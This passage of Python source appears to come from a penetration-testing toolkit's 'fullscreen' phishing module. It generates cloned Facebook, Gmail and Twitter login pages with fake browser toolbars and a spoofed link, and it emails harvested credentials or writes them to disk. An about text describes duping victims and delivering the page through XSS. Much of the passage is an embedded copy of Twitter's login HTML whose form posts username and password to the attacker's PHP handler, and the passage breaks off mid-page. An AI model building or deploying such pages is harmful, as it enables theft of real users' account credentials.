            jsCompletePath = os.getcwd() + self.pathDivider + self.dirFullScreenGmail + self.pathDivider + "js"
        elif optionList[0] == "TWITTER":
            jsCompletePath = os.getcwd() + self.pathDivider + self.dirFullScreenTwitter + self.pathDivider + "js"

        newJSDirectory = serverList[1] + self.pathDivider + "js"
        # Move Files now
        err = self.copyJunk(jsCompletePath,newJSDirectory)
        if err == "COPY":
            pass


        self.outputText("\n[*] Attempting to move CSS Files.......\n","red")
        if optionList[0] == "FB":
            cssCompletePath = os.getcwd() + self.pathDivider + self.dirFullScreenFacebook + self.pathDivider + "css"        
        elif optionList[0] == "GMAIL":
            cssCompletePath = os.getcwd() + self.pathDivider + self.dirFullScreenGmail + self.pathDivider + "css"
        elif optionList[0] == "TWITTER":
            cssCompletePath = os.getcwd() + self.pathDivider + self.dirFullScreenTwitter + self.pathDivider + "css"   

        newCSSDirectory = serverList[1] + self.pathDivider + "css"
        # Move Files now
        err = self.copyJunk(cssCompletePath,newCSSDirectory)
        if err == "COPY":
            pass


        self.outputText("\n[*] Attempting to Create The PHP Code Now.......\n","red")

        indexList = []
        # Disk or Mail default is disk if there is an error somehow
        if optionList[2] == "MAIL":
            indexList.append("mail")
        elif optionList[2] == "DISK":
            if optionList[3] == "RANDOM_FILE":
                indexList.append("diskRandom")
            else:
                indexList.append("diskFile")
        else:
            indexList.append("diskFile")

        # Redirect Check and do
        if otherList[1] == "REDIRECT_DEFAULT":
            if optionList[0] == "GMAIL":
                indexList.append("https://accounts.google.com/ServiceLoginAuth")
            elif optionList[0] == "FB":
                indexList.append("https://www.facebook.com/login.php?login_attempt=1")  
            elif optionList[0] == "TWITTER":
                indexList.append("https://twitter.com/login/error?redirect_after_login=%2F&username_or_email=")  
        else:
            indexList.append(otherList[1])

        # intel Verbose check now loud or quiet 
        if otherList[0] == "INTEL_VERBOSE_LOUD":
            indexList.append("loud")
        elif otherList[0] == "INTEL_VERBOSE_HUSH":
            indexList.append("quiet")
        else:
            indexList.append("quiet")

        # Append file name or email being sent too
        if optionList[2] == "MAIL":
            indexList.append(optionList[3])
        elif optionList[2] == "DISK" and optionList[3] != "RANDOM_FILE":
            indexList.append(optionList[3])
        else:
            # Random file has been picked we dont need a name
            indexList.append("POOP")
        

        # Put together the final list to create the index file
        indexFBList = []
        if otherList[2] == "DEFAULT_SPOOF":
          if optionList[0] == "GMAIL":
                indexFBList.append("https://www.gmail.com")
          elif optionList[0] == "FB":
                indexFBList.append("https://www.facebook.com")  
          elif optionList[0] == "TWITTER":
                indexFBList.append("https://www.twitter.com")  
        else:
           indexFBList.append(optionList[2])


        if otherList[3] == "DEFAULT_URL_NAME":
          if optionList[0] == "GMAIL":
                indexFBList.append("Gmail Login")
          elif optionList[0] == "FB":
                indexFBList.append("Facebook Login")  
          elif optionList[0] == "TWITTER":
                indexFBList.append("Twitter Login")  
        else:
           indexFBList.append(otherList[3])

        if otherList[5] == "TITLE_DEFAULT":
            if optionList[0] == "GMAIL":
                title = "Gmail: Email From Google"
            elif optionList[0] == "FB":
                title = "Welcome to Facebook - Log In, Sign Up or Learn More"
            elif optionList[0] == "TWITTER":
                title = "Sign in to Twitter"

        else:
            title = otherList[5]

        # image body 
        indexFBList.append("img/facebook/fb.png")
        # JS Files now
        indexFBList.append("js/libs/jquery-1.7.2.js")
        indexFBList.append("js/libs/browser-detect.js")
        indexFBList.append("js/libs/fullscreen-api-shim.js")
        indexFBList.append("js/libs/jquery-ui-1.8.18.custom.min.js")
        indexFBList.append("js/script.js")


        fbCode = []
        # Decide what code we need
        if optionList[0] == "FB":
            # Facebook html / PHP append code
            fbCode.append(self.fullscreenFileHTML(indexFBList,"img",indexList,title,"FB"))      
        elif optionList[0] == "GMAIL":
            # Gmail html / PHP append code
            fbCode.append(self.fullscreenFileHTML(indexFBList,"img",indexList,title,"GMAIL"))      
        elif optionList[0] == "TWITTER":
            # Gmail html / PHP append code
            fbCode.append(self.fullscreenFileHTML(indexFBList,"img",indexList,title,"TWITTER"))          

        # save as index.php  no path divider this should always be / for localhost or specified host
        if otherList[4] == "INDEX_DEFAULT":
            errCheck = self.saveFile(serverList[1] + "/index.php",fbCode,"text")
            if errCheck == "ERR_FILE_OPEN":
                self.errorOutput("[!] Error - Couldn't Create [index.php] File Check Folder Permissions","yellow")
                return False
        # Save as whatever the user has picked
        else:
            errCheck = self.saveFile(serverList[1] + "/" + otherList[4],fbCode,"text")
            if errCheck == "ERR_FILE_OPEN":
                self.errorOutput("[!] Error - Couldn't Create [\""+otherList[4]+"\"] File Check Folder Permissions","yellow")
                return False
        
        # Check if the path of the file is there and created
        if os.path.exists(serverList[1]+"/"+otherList[4]) or os.path.exists(serverList[1]+ "/index.php"):
            # Success on writing it seeems
            return True
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																						
        else: return False
  
   ################################################################################
   ################################################################################

    def outputText(self,text,color):
    # this actually outputs text plus whatever color nothing fancy

        # Obviously a POSIX System grab color
        if self.determineOperatingSystem() != "windows":

            # decide the fate of what color we shall use to output
            if color == "white":
                color = '\033[37m'
            elif color == "red":
                color = '\033[31m'
            elif color == "cyan":
                color = '\033[36m'
            elif color == "blue":
                color = '\033[34m'
            elif color == "magenta":
                color = '\033[35m'
            elif color == "darkyellow":
                color = '\033[33m'
            elif color == "yellow":
                color = '\033[93m'
            elif color == "darkgreen":
                color = '\033[32m'
            elif color == "green":
                color = '\033[92m'
            elif color == "black":
                color = '\033[30m'
 
        # Windows lol :P
        elif self.determineOperatingSystem() == "windows":

            if color == "white":
                color = ''
            elif color == "red":
                color = ''
            elif color == "cyan":
                color = ''
            elif color == "blue":
                color = ''
            elif color == "magenta":
                color = ''
            elif color == "darkyellow":
                color = ''
            elif color == "yellow":
                color = ''
            elif color == "darkgreen":
                color = ''
            elif color == "green":
                color = ''
            elif color == "black":
                color = ''

        # Display User Text
        print (color + text)

   ################################################################################
   ################################################################################

    def displayPrompt(self,promptType = "Main"):
    # This Displays the command prompt and returns the data in a list
    # Depending on what command prompt you want

        try:
            if promptType == "Main":
                self.outputText('',"green") 
                try: 
                    self.inputData = raw_input("set:fsattack> ")
                except:
                    self.inputData = raw_input("set:fsattack> ")
            # FullScreen Prompt
            elif promptType == "FullScreen":
                self.outputText('',"blue") 
                try:
                    self.inputData = raw_input("set:fsattack:gen> ")
                except:
                    self.inputData = raw_input("set:fsattack:gen> ")
            elif promptType == "XSS":
                self.outputText('',"white") 
                try:
                    self.inputData = raw_input("set:fsattack:xssGen> ")
                except:
                    self.inputData = raw_input("set:fsattack:xssGen> ")
            else: 
                self.outputText('',"darkgreen")
                # When in Doubt Display Default Please
                try:
                    self.inputData = raw_input("set:pf> ")
                except:
                    self.inputData = raw_input("set:pf> ")
        except EOFError:
            pass
        # if control c skip and enter
        except KeyboardInterrupt:
            # Initiate an Exit command
            self.inputData = "99"
        try:	
            # cast to string incase its !string for split
            handOff = str(self.inputData)
            # take input and explode at space for commands and such	
            self.inputData = handOff.split(" ")
        except UnboundLocalError:
            pass
	
        # return input data
        return self.inputData

   ################################################################################
   ################################################################################

    def checkString(self,string):
    # character other then  . - a-z - A-Z - 0-9 

        # implement the filter pattern
        pattern = r'[^\.a-zA-Z0-9]'
        if re.search(pattern, string):
            # Not Alpha-Numerical
            return False
        else:
            # Only Alpha-Numerical 
            return True

   ################################################################################
   ################################################################################

    def returnPrompt(self,promptType):
    # This just returns the user to main prompt on default 
    # If we need to add extra functionality lets do it
       
     
        if promptType == "FULL_SCREEN":
            self.phishMenuFullScreen(False)
        # Return back to Main Screen
        elif promptType == "MAIN_SCREEN":
            self.phishMenuMain(False)
        # Return Back to Main XSS Menu
        elif promptType == "XSS":
            self.xssFullScreenGenerator(False)
        else:
            # Return to Main Prompt
            self.phishMenuMain(False)

   ################################################################################
   ################################################################################

    def errorOutput(self,errMsg,colorMsg,promptType = "FULL_SCREEN"):
    # This Handles all the Errors in the Module
    # If you want to log them also you can add that here :D
       
        # Throw Error
        self.outputText(errMsg,colorMsg)
        # Return to Prompt
        self.returnPrompt(promptType)


   ################################################################################
   ################################################################################

    def phpEnabled(self):
    # Checks if PHP is Enabled and should we use it for added functionality

        phpList = []
        # PHP Must be Enabled lets check   
        self.results = raw_input("\nIs PHP Enabled on your WebServer? ( y OR n ): ")      
        if self.results.lower()[0] == "y" or self.results.lower() == "yes":
            phpList.append("YES_PHP")  
        elif self.results[0].lower() == "n" or self.results.lower() == "no":
            self.phpInstalled = """\n
            [*]  PHP Must be Installed on the Server for 
                 Added Functionality to the actual Attack Vector 
                 itself. Not to mention giving us a communication channel 
                 to relay important information. 
               ( Such As the Pen Test Victims Information ) 
            """
            self.outputText(self.phpInstalled,"white")
            self.errorOutput("\t[!] Error - PHP Must be Installed And Available ","yellow")
        else:
            self.errorOutput("[!] Error - Please Enter Yes or No ","yellow")

        return phpList

   ################################################################################
   ################################################################################


     
  ############################################################################################################

    def getRelayFullScreenInformation(self,phpEnabled = "YES_PHP"):   
    # Sort out how we are gonna store phished results 

        storageList = []
        # Mail or Disk ask user
        self.results = raw_input("\nHow Should We Relay Victim Web Form Information? ( [m]ail,[d]isk ) : ")
        if self.results.lower()[0] == "m" or self.results.lower() == "mail":
            self.outputText("\n[!] Warning - Sendmail Should be Configured and Working with PHP For This to Work\n","yellow")
            storageList.append("MAIL")
            self.results = raw_input("\nPlease Enter an Email Address For Form Credentials to Get Sent Too: ")
            # If we can split by @ its ok not a serious check not a reason for one if there stupid its there fault..
            if self.results.split("@") and len(self.results) > 5:
                storageList.append(self.results)
            else:
                # Throw Error improper email no @
                self.errorOutput("[!] Error Please Enter a Correct Email Address","yellow")
        elif self.results.lower()[0] == "d" or self.results.lower() == "disk":
            # We need PHP to store the file on server
            if phpEnabled == "NO_PHP":
                self.errorOutput("[!] Error - We Can't Write the File to the Servers Disk Without PHP Enabled","yellow")
            else:
                storageList.append("DISK")
                # Ask if they want a Random File name created
                self.results = raw_input("\nWould you like a Random file name Created for each Submission? ([y]es or [n]o) : ")
                if self.results.lower()[0] == "y" or self.results.lower() == "yes":
                    storageList.append("RANDOM_FILE")
                else:
                    self.results = raw_input("\nSpecify a File Name for the saved Intel? ( Ex: f00d ) : ")
                    # Check if string is AlphaNumerical
                    if  self.checkString(self.results) == False:
                        self.errorOutput("[!] Error - Invalid File Name Specified! AlphaNumerical + Periods Only! ","yellow")
                    else:
                        storageList.append(self.results)
        else:
            self.errorOutput("[!] Error - Please Specify either [m]ail or [d]isk ! ","yellow")


        # Return List for use
        return storageList

   ################################################################################
   ################################################################################

    def xssPayloadGenerator(self):
    # Very Simple XSS Payload Generator 
    # TODO: Complete This Function

        bannerDisplay = """\n\n
            [*] Under development!

            """
        self.outputText(bannerDisplay,"yellow")
        self.phishMenuMain(False)


   ################################################################################
   ################################################################################

    def exitFullScreenPhish(self):
    # Add The Return SET Menu Here

        # Grab Application Name
        appName = sys.argv[0]

        # linux or mac/unixIsh close out
        if self.determineOperatingSystem() == "posix":
            # close linux unix processes
            self.closeLinuxUnixProcesses(appName)

        # Winblows Check	        
        elif self.determineOperatingSystem() == "windows":
            # close windows processes
            self.closeWindowsProcesses(appName)

        # No POSIX System or Windows Fail Silently and Exit 
        else:
            pass

        # Display Exit Banner for User
        self.fullScreenExitBanner = """\n
        [!] Closing any Processes Open By Module
        [!] Returning Back to Web Attacks Menu\n
        """
        self.outputText(self.fullScreenExitBanner,"cyan")

        # Exit Success  TODO: EDIT THIS TO CALL SET MENU
        # THIS SHOULD RETURN BACK TO WEB ATTACK MENU HERE 
        #exit(0)
        return True

   ################################################################################
   ################################################################################

    def closeWindowsProcesses(self,appName):
    # This kills all windows processes running braH 

        # kill process
        try:
            handle = subprocess.Popen(appName, shell=False)
            subprocess.Popen("taskkill /F /T /PID %i"%handle.pid , shell=True) 
        except (ValueError, OSError):
            pass

   ################################################################################
   ################################################################################

    def closeLinuxUnixProcesses(self,appName):
    # close out all processes in linux n unix machines

        p = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
        out, err = p.communicate()
        for line in out.splitlines():
            if appName in line:
                try:
                    pid = int(line.split(None, 1)[0])
                    os.kill(pid, signal.SIGKILL)
                except OSError:
                    pass

   ################################################################################
   ################################################################################

    def determineOperatingSystem(self):
    # return the operating system to user 

        # assign the variables 
        operating_system = self.checkOs()
        # Returns operating system
        return operating_system


   ################################################################################
   ################################################################################

    def checkOs(self):
    #actually does the grunt work returns the operating system 

	 # This function only looks for Mac,Linux or Windows
	 # check if its apple user
        if sys.platform == "darwin":
            operating_system = "posix"
        # Check for Windows
        elif os.name == "nt":
            operating_system = "windows"
        # Check for Linux
        elif os.name == "posix":
            operating_system = "posix"
        else:
            operating_system = "windows"
        # Return our operating system
        return operating_system

   ################################################################################
   ################################################################################


    def displayAboutFullScreen(self):
    # This just displays a description about the attacks 


        self.aboutFullScreenTop = """
      \n\t[?] About - FullScreen API Generator Attack \n 
        -----------------------------------------------------------"""
        self.aboutFullScreenBottom = """
      =   Once Deployed the Customized files are 
      =   placed in the selected Web Servers 
      =   WWW Directory. Browse to the files by 
      =   visiting localhost/index.html or localhost/index.php.
      =   Index being the name of the main file. The index 
      =   file can be re-named to prevent file name conflicts.
      =   Once the Victim goes to the website they are then 
      =   dupped into clicking a Spoofed Link That shows 
      =   the Actual Website But when clicked does not goto it. 
      =   This attack also works great by placing the site and 
      =   link and deploying it using an XSS vector of attack.
      =   As long as Javascript can be Displayed in the XSS Vuln.
      =   and maybe other factors.. After clicking on the Spoofed link 
      =   the Victims Full-Screen is then completely taken over 
      =   and replaced with Fake Browser / Operating System 
      =   Toolbars & Menu images. You can pick from four preconfigured
      =   FullScreen templates. PHP will
      =   return the information, Along with also grabbing a ton
      =   of other very interesting facts about the user.
       """
        self.aboutFullScreenFooter = """	
      [?]  Compatible:    

      =       This Attack Works With - FireFox , Chrome, 
      =    Safari 6 (on OS X 10.8 Mountain Lion).
      =    Supported Images for Operating Systems: 
      =    Windows Linux & Mac
      =
      =   It Automatically Detects What Browser/OS 
      =   the victim is using and Deploys the Proper Images.
      =   It Also Requires PHP Installed on the Web Server
      =   Running the Files for Proper File Relaying.
      =   *ATTENTION*  If Sendmail is not properly configured stick to 
      =   writing the information to disk.
        """

        self.outputText(self.aboutFullScreenTop,"white")
        self.outputText(self.aboutFullScreenBottom,"darkyellow")
        self.outputText(self.aboutFullScreenFooter,"yellow")

        # Display Prompt Again
        self.phishMenuFullScreen(False)

   ################################################################################
   ################################################################################

    def openFile(self,fileInput,fileType):
    # This method only opens and returns a file
    # for you to do the manipulation and use the data from the file
        
	# check if the file is present	
        if os.path.exists(fileInput):

            if fileType == "text":
		
                try:
	            # open the file for return
                    openFile = open(fileInput,'r+')
                except IOError:
                    #Throw Errr Couldnt Open
                    return "ERR_FILE_OPEN"
		
            if fileType == "bin":
  
                try:
	            # open the file for return
                    openFile= open(fileInput,'r+b')
                except IOError:
                    #Throw Errr Couldnt Open
                    return "ERR_FILE_OPEN"
	     # return the file	
            return openFile
        else:
            # No file found to open throw error		
            return "NO_FILE_FOUND"
	
   ################################################################################
   ################################################################################
 
    def saveFile(self,fileInput,fileData,fileType):
    # This saves the file creates one and saves it not exists or appends if it does 

        if fileType == "text":
            try:
                if os.path.isfile(fileInput):
	             # save the file append because it already exists
                    openFile = open(fileInput,'a+')
                    # write file 
                    for s in (str(item[0]) for item in fileData):
                        openFile.write(s+'\n')
                else:
                    # Write file it doesnt exist yet from what we can tell
                    openFile = open(fileInput,'w+')
                    # write file 
                    for s in (str(item[0]) for item in fileData):
                        openFile.write(s+'\n')
	         # close
                openFile.close()

            except IOError:
                 #Throw Errr Couldnt Open
                 return "ERR_FILE_OPEN"
		
        if fileType == "bin":
            try:
                if os.path.isfile(fileInput):
	             # save the file append because it already exists
                    openFile = open(fileInput,'a+b')
                    # write file 
                    for s in (str(item[0]) for item in fileData):
                        openFile.write(s+'\n')
                else:
                    # Write file it doesnt exist yet from what we can tell
                    openFile = open(fileInput,'w+b')
                    # write file 
                    for s in (str(item[0]) for item in fileData):
                        openFile.write(s+'\n')
	         # close
                openFile.close()

            except IOError:
                 #Throw Errr Couldnt Open
                 return "ERR_FILE_OPEN"
		
	 # return TRUE  file_written
        return "FILE_WRITTEN"

   ################################################################################
   ################################################################################

    def fullscreenFileHTML(self,pathList,imgPath,valueList,title,codeType):
    # This Holds All the HTML for the Fullscreen Attack Files [ fullscreen generation  only ]
    # This is a long function lol could be split into another file but i wanted to keep
    # everything in one file just for ease of portability at first.         

        # twitter HTML for twitter fullscreen site
        if codeType == "TWITTER":
            indexList = []
            indexCode = """
<!doctype html>
<html class="no-js" lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>"""+title+"""</title>
<meta name="description" content="">
<link rel="stylesheet" href="css/style.css">
</head>
<body>
  
   <a class=\"spoofLink\" href=\""""+pathList[0]+"""\">"""+pathList[1]+"""</a>

  <div id="spoofHeader">
    <div id="spoofMenu"></div>
    <div id="spoofBrowser"></div>
  </div>


<div id="spoofSite">

<!DOCTYPE html>
<!--[if IE 8]><html class="lt-ie10 ie8" lang="en"><![endif]-->
<!--[if IE 9]><html class="lt-ie10 ie9" lang="en"><![endif]-->
<!--[if gt IE 9]><!--><html lang="en"><!--<![endif]-->
  <head>

    
    <meta charset="utf-8">
    <meta name="description" content="Sign in to Twitter. Welcome back!">
    
    <meta name="msapplication-TileImage" content="//abs.twimg.com/favicons/win8-tile-144.png"/>
    <meta name="msapplication-TileColor" content="#00aced"/>
    
      <link href="http://abs.twimg.com/favicons/favicon.ico" rel="shortcut icon" type="image/x-icon">
    
        <meta name="viewport" id="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    
      <meta name="swift-page-name" id="swift-page-name" content="login">
    
        <link rel="canonical" href="https://twitter.com/login/error">
    
    
    
    <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="Twitter">
    
    

          <link rel="stylesheet" href="https://abs.twimg.com/a/1383847355/t1/css/t1_core_logged_out.bundle.css" type="text/css">
    
        <link rel="stylesheet" href="https://abs.twimg.com/a/1383847355/t1/css/t1_more.bundle.css" type="text/css">
      </head>
  <body class="t1 logged-out" 
data-fouc-class-names="swift-loading"
 dir="ltr">
      <script id="swift_loading_indicator">
        document.body.className=document.body.className+" "+document.body.getAttribute("data-fouc-class-names");
      </script>
    <div id="doc" class="route-login">
        <div class="topbar js-topbar">
          <div id="banners" class="js-banners">
          </div>
          <div class="global-nav" data-section-term="top_nav">
            <div class="global-nav-inner">
              <div class="container">
        
                
                 <ul class="nav js-global-actions"><li class="home" data-global-action="t1home">  <a class="nav-logo-link" href="/" data-nav="front"> <span class="icon bird-topbar-blue"><span class="visuallyhidden">Twitter</span></span> </a>   </li> </ul>  <div class="pull-right"> <div role="search">
  <form class="form-search js-search-form" action="/search" id="global-nav-search">
    <label class="visuallyhidden" for="search-query">Search query</label>
    <input class="search-input" type="text" id="search-query" placeholder="Search" name="q" autocomplete="off" spellcheck="false">
    <span class="search-icon js-search-action">
      <button type="submit" class="icon nav-search">
        <span class="visuallyhidden">
          
          Search
        </span>
      </button>
    </span>
    <input disabled="disabled" class="search-input search-hinting-input" type="text" id="search-query-hint" autocomplete="off" spellcheck="false">
      <div role="menu" aria-hidden="true" class="dropdown-menu typeahead ">
        <div aria-hidden="true" class="dropdown-caret">
          <div class="caret-outer"></div>
          <div class="caret-inner"></div>
        </div>
        <div role="presentation" class="dropdown-inner js-typeahead-results">
          <div role="presentation" class="typeahead-saved-searches">
      <ul role="presentation" class="typeahead-items saved-searches-list">
        
        <li role="presentation" class="typeahead-item typeahead-saved-search-item">
          <span class="icon close" aria-hidden="true"><span class="visuallyhidden">Remove</span></span>
          <a role="menuitem" aria-describedby="saved-searches-heading" class="js-nav" href="" data-search-query="" data-query-source="" data-ds="saved_search" tabindex="-1"><span class="icon generic-search"></span></a>
        </li>
      </ul>
    </div>
    <ul role="presentation" class="typeahead-items typeahead-topics">
      
      <li role="presentation" class="typeahead-item typeahead-topic-item">
        <a role="menuitem" class="js-nav" href="" data-search-query="" data-query-source="typeahead_click" data-ds="topics" tabindex="-1">
          <span class="icon generic-search"></span>
        </a>
      </li>
    </ul>
    
    <ul role="presentation" class="typeahead-items typeahead-accounts social-context js-typeahead-accounts">
      
      <li role="presentation" data-user-id="" data-user-screenname="" data-remote="true" data-score="" class="typeahead-item typeahead-account-item js-selectable">
        
        <a role="menuitem" class="js-nav" data-query-source="typeahead_click" data-search-query="" data-ds="account">
          <img class="avatar size32" alt="">
          <span class="typeahead-user-item-info">
            <span class="fullname"></span>
            <span class="js-verified hidden"><span class="icon verified"><span class="visuallyhidden">Verified account</span></span></span>
            <span class="username"><s>@</s><b></b></span>
          </span>
          <span class="typeahead-social-context"></span>
        </a>
      </li>
      <li role="presentation" class="js-selectable typeahead-accounts-shortcut js-shortcut"><a role="menuitem" class="js-nav" href="" data-search-query="" data-query-source="typeahead_click" data-shortcut="true" data-ds="account_search"></a></li>
    </ul>
    <ul role="presentation" class="typeahead-items typeahead-trend-locations-list">
      
      <li role="presenation" class="typeahead-item typeahead-trend-locations-item"><a role="menuitem" class="js-nav" href="" data-ds="trend_location" data-search-query="" tabindex="-1"></a></li>
    </ul>    <ul role="presentation" class="typeahead-items typeahead-context-list">
      
      <li role="presentation" class="typeahead-item typeahead-context-item"><a role="menuitem" class="js-nav" href="" data-ds="context_helper" data-search-query="" tabindex="-1"></a></li>
    </ul>  </div>
      </div>
  </form>
</div> <ul class="nav secondary-nav language-dropdown"> <li class="dropdown js-language-dropdown"> <a href="#supported_languages" class="dropdown-toggle js-dropdown-toggle"> <small>Language:</small> <span class="js-current-language">English</span> <b class="caret"></b> </a> <div class="dropdown-menu"> <div class="dropdown-caret right"> <span class="caret-outer"> </span> <span class="caret-inner"></span> </div> <ul id="supported_languages">  <li><a href="?lang=id" data-lang-code="id" title="Indonesian" class="js-language-link js-tooltip">Bahasa Indonesia</a></li>  <li><a href="?lang=msa" data-lang-code="msa" title="Malay" class="js-language-link js-tooltip">Bahasa Melayu</a></li>  <li><a href="?lang=da" data-lang-code="da" title="Danish" class="js-language-link js-tooltip">Dansk</a></li>  <li><a href="?lang=de" data-lang-code="de" title="German" class="js-language-link js-tooltip">Deutsch</a></li>  <li><a href="?lang=en-gb" data-lang-code="en-gb" title="English UK" class="js-language-link js-tooltip">EnglishUK</a></li>  <li><a href="?lang=es" data-lang-code="es" title="Spanish" class="js-language-link js-tooltip">Espaol</a></li>  <li><a href="?lang=eu" data-lang-code="eu" title="Basque" class="js-language-link js-tooltip">Euskara</a></li>  <li><a href="?lang=fil" data-lang-code="fil" title="Filipino" class="js-language-link js-tooltip">Filipino</a></li>  <li><a href="?lang=gl" data-lang-code="gl" title="Galician" class="js-language-link js-tooltip">Galego</a></li>  <li><a href="?lang=it" data-lang-code="it" title="Italian" class="js-language-link js-tooltip">Italiano</a></li>  <li><a href="?lang=xx-lc" data-lang-code="xx-lc" title="Lolcat" class="js-language-link js-tooltip">LOLCATZ</a></li>  <li><a href="?lang=hu" data-lang-code="hu" title="Hungarian" class="js-language-link js-tooltip">Magyar</a></li>  <li><a href="?lang=nl" data-lang-code="nl" title="Dutch" class="js-language-link js-tooltip">Nederlands</a></li>  <li><a href="?lang=no" data-lang-code="no" title="Norwegian" class="js-language-link js-tooltip">Norsk</a></li>  <li><a href="?lang=pl" data-lang-code="pl" title="Polish" class="js-language-link js-tooltip">Polski</a></li>  <li><a href="?lang=pt" data-lang-code="pt" title="Portuguese" class="js-language-link js-tooltip">Portugus</a></li>  <li><a href="?lang=fi" data-lang-code="fi" title="Finnish" class="js-language-link js-tooltip">Suomi</a></li>  <li><a href="?lang=sv" data-lang-code="sv" title="Swedish" class="js-language-link js-tooltip">Svenska</a></li>  <li><a href="?lang=tr" data-lang-code="tr" title="Turkish" class="js-language-link js-tooltip">Trke</a></li>  <li><a href="?lang=ca" data-lang-code="ca" title="Catalan" class="js-language-link js-tooltip">catal</a></li>  <li><a href="?lang=fr" data-lang-code="fr" title="French" class="js-language-link js-tooltip">franais</a></li>  <li><a href="?lang=ro" data-lang-code="ro" title="Romanian" class="js-language-link js-tooltip">romn</a></li>  <li><a href="?lang=cs" data-lang-code="cs" title="Czech" class="js-language-link js-tooltip">etina</a></li>  <li><a href="?lang=el" data-lang-code="el" title="Greek" class="js-language-link js-tooltip"></a></li>  <li><a href="?lang=ru" data-lang-code="ru" title="Russian" class="js-language-link js-tooltip"></a></li>  <li><a href="?lang=uk" data-lang-code="uk" title="Ukrainian" class="js-language-link js-tooltip"> </a></li>  <li><a href="?lang=he" data-lang-code="he" title="Hebrew" class="js-language-link js-tooltip"></a></li>  <li><a href="?lang=ur" data-lang-code="ur" title="Urdu" class="js-language-link js-tooltip"></a></li>  <li><a href="?lang=ar" data-lang-code="ar" title="Arabic" class="js-language-link js-tooltip"></a></li>  <li><a href="?lang=fa" data-lang-code="fa" title="Farsi" class="js-language-link js-tooltip"></a></li>  <li><a href="?lang=hi" data-lang-code="hi" title="Hindi" class="js-language-link js-tooltip"></a></li>  <li><a href="?lang=th" data-lang-code="th" title="Thai" class="js-language-link js-tooltip"></a></li>  <li><a href="?lang=ja" data-lang-code="ja" title="Japanese" class="js-language-link js-tooltip"></a></li>  <li><a href="?lang=zh-cn" data-lang-code="zh-cn" title="Simplified Chinese" class="js-language-link js-tooltip"></a></li>  <li><a href="?lang=zh-tw" data-lang-code="zh-tw" title="Traditional Chinese" class="js-language-link js-tooltip"></a></li>  <li><a href="?lang=ko" data-lang-code="ko" title="Korean" class="js-language-link js-tooltip"></a></li>  </ul> </div> <div class="js-front-language"> <form action="/sessions/change_locale" class="language" method="POST"> <input type="hidden" name="lang"> <input type="hidden" name="redirect"> <input type="hidden" name="authenticity_token" value="d6b7bcb9949f04c0b74b17dbcf331ab83e5e5d58"> </form> </div> </li> </ul>  <ul class="nav secondary-nav session-dropdown" id="session"> <li class="dropdown js-session"> <a href="/login" class="dropdown-toggle js-dropdown-toggle dropdown-signin" id="signin-link" data-nav="login"> <small>Have an account?</small> Sign in<span class="caret"></span> </a> <a href="https://twitter.com/signup?context=login" class="dropdown-signup" id="signup-link" data-nav="signup"> <small>New to Twitter?</small><span class="emphasize"> Join Today &raquo;</span> </a> <div class="dropdown-menu dropdown-form" id="signin-dropdown"> <div class="dropdown-caret right"> <span class="caret-outer"></span> <span class="caret-inner"></span> </div> <div class="signin-dialog-body">

 <form action="<?php echo $_SERVER['PHP_SELF']; ?>" class="js-signin signin" method="post">
  <fieldset>
    <legend id="signin-form-legend" class="visuallyhidden">Sign In</legend>
    <fieldset class="textbox">
      <label class="username js-username">
        <span>Username or email</span>
        <input class="js-username-field email-input js-initial-focus" type="text" name="Username" autocomplete="on">
      </label>
      <label class="password js-password">
        <span>Password</span>
        <input class="js-password-field" type="password" value="" name="Password">
      </label>
    </fieldset>
    <fieldset class="subchck">
      <button type="submit" class="btn submit">Sign in</button>
      <label class="remember">
        <input type="checkbox" value="1" name="remember_me" checked="checked">
        <span>Remember me</span>
      </label>
    </fieldset>
    
    <input type="hidden" name="scribe_log">
    <input type="hidden" name="redirect_after_login" value="/">
    <input type="hidden" value="d6b7bcb9949f04c0b74b17dbcf331ab83e5e5d58" name="authenticity_token"/>
  </fieldset>
  <div class="divider"></div>
  <p class="footer-links">
    
    <a class="forgot" href="/account/resend_password">Forgot password?</a><br />
    <a class="mobile has-sms" href="/account/complete">Already using Twitter via text message?</a>
  </p>
</form>
 </div> </div> </li> </ul> </div> 
        
                
                <button type="button" id="close-all-button" class="close-all-tweets js-close-all-tweets js-tooltip" title="Close all open Tweets">
                  <span class="icon nav-breaker"><span class="visuallyhidden">Close all open Tweets</span></button>
                </button>
              </div>
            </div>
          </div>
        
        </div>
        <div id="page-outer">
          <div id="page-container" class="wrapper wrapper-login white">
            <div class="page-canvas">

  <div class="signin-wrapper" data-login-message="false">
    <h1>Sign in to Twitter</h1>
    <form action="https://twitter.com/sessions" class="clearfix signin js-signin" method="post">
      <fieldset>
      
        <div class="clearfix holding hasome">
          <span class="username js-username holder">Username or email</span>
          <input class="js-username-field email-input js-initial-focus" type="text" name="session[username_or_email]" autocomplete="on" value="">
        </div>
      
        <div class="clearfix holding">
          <span class="password holder">Password</span>
          <input class="js-password-field" type="password" name="session[password]">
        </div>
      
        <input type="hidden" value="d6b7bcb9949f04c0b74b17dbcf331ab83e5e5d58" name="authenticity_token"/>
      
      </fieldset>
      <div class="captcha js-captcha">
      </div>
      <div class="clearfix">
      
        <input type="hidden" name="scribe_log">
        <input type="hidden" name="redirect_after_login" value="/">
        <input type="hidden" value="d6b7bcb9949f04c0b74b17dbcf331ab83e5e5d58" name="authenticity_token"/>
        <button type="submit" class="submit btn primary-btn">Sign in</button>
      
        <fieldset class="subchck">
          <label class="remember">
            <input type="checkbox" value="1" name="remember_me" checked="checked">
            Remember me
          </label>
        </fieldset>
        <span class="separator"></span>
        <a class="forgot" href="/account/resend_password">Forgot password?</a>
      
      </div>
    </form>
  </div>

  <div class="clearfix mobile has-sms">
    <p class="signup-helper">
      New to Twitter?
      <a id="login-signup-link" href="https://twitter.com/signup">Sign up now&#32;&raquo;</a>
    </p>
    <p>
      Already using Twitter via text message?
      <a href="/account/complete">Activate your account&#32;&raquo;</a>
    </p>
  </div>

</div>

          </div>
        </div>
          </div>
    <div class="alert-messages " id="message-drawer">
        <div class="message ">
      <div class="message-inside">
        <span class="message-text">Wrong Username/Email and password combination.</span>
            <a class="dismiss" href="#">&times;</a>
      </div>
    </div></div>
    <div class="gallery-overlay"></div>
<div class="gallery-container">
  <div class="gallery-close-target"></div>
